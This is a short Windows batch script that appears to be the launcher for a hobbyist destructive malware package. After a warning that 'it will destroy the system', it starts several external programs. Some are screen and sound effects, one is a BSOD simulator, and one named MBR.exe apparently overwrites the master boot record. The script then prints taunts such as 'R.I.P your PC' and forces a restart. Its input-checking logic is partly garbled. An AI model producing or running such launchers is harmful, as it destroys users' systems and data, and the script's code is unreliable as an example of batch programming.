
@echo off

echo wanna start
set /p input=
if /i %input%==Y goto yes
if /i %input%==N goto No
if /i not %input%== Ygr,wininit goto 1
:yes
echo are you sure, it will destroy the system.
start invmelter.exe
if /i %input%==Yes goto yes2
if /i %input%==No goto No2
:yes2
timeout 2
echo your PC Has been fucked
start crazysound6.exe
timeout 61
start tunnel.exe
timeout 31
start MBR.exe
start bytebeat1.exe
timeout 81
start invmelter.exe
start invmelter.exe
start invmelter.exe
start invmelter.exe
timeout 200
start BSOD Simulator.exe
timeout 100
echo R.I.P your PC
echo your PC has been fucked, anyways 
echo enjoy the windows 8 pink addon
timeout 2
echo I WARNED YOU
shutdown /r /t 6.666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
